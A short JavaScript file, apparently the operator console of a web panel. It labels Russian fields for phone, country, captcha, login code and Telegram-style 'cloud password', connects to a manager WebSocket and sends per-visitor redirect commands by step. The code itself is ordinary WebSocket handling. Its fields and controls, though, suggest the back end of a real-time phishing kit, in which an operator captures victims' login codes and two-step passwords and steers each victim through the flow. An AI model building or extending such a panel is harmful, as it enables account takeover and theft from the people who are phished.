const MANAGER_FIELD_LABELS = {
    phone: 'Телефон',
    country: 'Страна',
    captcha: 'Капча',
    code: 'Код',
    password: 'Облачный пароль',
    navigation: 'Переход',
};

function connectManagerSocket(handlers) {
    handlers = handlers || {};
    let socket = null;

    function connect() {
        const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
        const wsUrl = `${protocol}://${location.host}/ws/manager/`;
        socket = new WebSocket(wsUrl);

        socket.addEventListener('open', () => {
            if (handlers.onOpen) {
                handlers.onOpen();
            }
        });

        socket.addEventListener('message', (event) => {
            let data;
            try {
                data = JSON.parse(event.data);
            } catch (e) {
                return;
            }
            if (handlers.onMessage) {
                handlers.onMessage(data);
            }
        });

        socket.addEventListener('close', () => {
            if (handlers.onClose) {
                handlers.onClose();
            }
            setTimeout(connect, 1000);
        });
    }

    connect();

    return {
        send(data) {
            if (socket && socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify(data));
            }
        },
    };
}

function sendVisitorRedirect(connection, visitorId, url, step) {
    connection.send({
        type: 'command',
        visitor_id: visitorId,
        command: { action: 'redirect', url: url, step: step },
    });
}
